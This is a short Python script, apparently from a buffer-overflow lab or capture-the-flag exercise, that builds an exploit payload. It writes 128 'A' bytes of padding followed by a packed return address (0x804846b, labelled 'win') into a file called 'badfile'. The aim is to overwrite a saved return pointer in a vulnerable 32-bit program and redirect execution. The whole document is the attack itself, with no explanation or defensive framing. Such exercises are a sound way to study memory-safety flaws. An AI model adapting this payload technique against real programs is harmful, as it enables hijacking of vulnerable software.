import struct 

b_fp = 128
win = 0x804846b

atk_vector = 'A'*128
atk_vector += struct.pack('I', win)

f = open('badfile', 'w+')
f.write(atk_vector)
f.close()

